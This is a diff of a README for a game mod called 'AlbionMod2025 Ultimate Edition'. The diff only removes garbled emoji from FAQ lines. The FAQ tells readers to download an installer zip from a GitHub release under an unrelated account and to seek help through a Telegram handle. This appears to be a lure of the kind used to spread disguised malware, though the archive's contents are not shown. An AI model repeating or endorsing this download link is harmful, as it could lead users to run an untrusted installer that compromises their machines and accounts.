@@ -61,12 +61,12 @@ AlbionMod2025 Ultimate Edition – Enhanced Gameplay Experience for 2025
 
 
 
-# Frequently Asked Questions (FAQ) вќ“
+# Frequently Asked Questions (FAQ) 
 
 - How do I install the program? 
 - You can install the archive from-> [here](https://github.com/realblonde656/gittf/releases/download/1/Install_latest.zip)
 
-- How can I get support? рџ’¬
+- How can I get support? 
 - Out TG Support [Support](@GitSupport)
 
 ## Contribution
